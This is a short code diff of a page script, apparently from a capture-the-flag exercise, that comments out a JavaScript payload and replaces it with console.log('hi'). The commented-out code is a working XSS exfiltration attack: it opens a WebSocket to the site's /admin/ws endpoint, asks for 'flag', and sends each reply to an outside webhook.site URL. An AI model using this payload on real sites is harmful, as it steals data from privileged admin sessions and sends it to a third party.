@@ -1,17 +1,18 @@
 <script>
-    fetch(`https://webhook.site/01279e62-a889-4877-a85d-5b97f09fe9ee?flag=started`)
-    try {
-        const ws1 = new WebSocket(`ws://${window.location.host}/admin/ws`);
-        ws1.onmessage = (event) => {
-            fetch(`https://webhook.site/01279e62-a889-4877-a85d-5b97f09fe9ee?flag=${event.data}`)
-            .catch((err) => {
-                fetch(`https://webhook.site/01279e62-a889-4877-a85d-5b97f09fe9ee?flag=error`)
-            });
-        };
-        ws1.onopen = () => ws1.send('flag')
-        fetch(`https://webhook.site/01279e62-a889-4877-a85d-5b97f09fe9ee?flag=end`)
-    } catch (error) {
-        fetch(`https://webhook.site/01279e62-a889-4877-a85d-5b97f09fe9ee?flag=${error.message}`)
-    }
+    // fetch(`https://webhook.site/01279e62-a889-4877-a85d-5b97f09fe9ee?flag=started`)
+    // try {
+    //     const ws1 = new WebSocket(`ws://${window.location.host}/admin/ws`);
+    //     ws1.onmessage = (event) => {
+    //         fetch(`https://webhook.site/01279e62-a889-4877-a85d-5b97f09fe9ee?flag=${event.data}`)
+    //         .catch((err) => {
+    //             fetch(`https://webhook.site/01279e62-a889-4877-a85d-5b97f09fe9ee?flag=error`)
+    //         });
+    //     };
+    //     ws1.onopen = () => ws1.send('flag')
+    //     fetch(`https://webhook.site/01279e62-a889-4877-a85d-5b97f09fe9ee?flag=end`)
+    // } catch (error) {
+    //     fetch(`https://webhook.site/01279e62-a889-4877-a85d-5b97f09fe9ee?flag=${error.message}`)
+    // }
+    console.log("hi")
     
 </script>
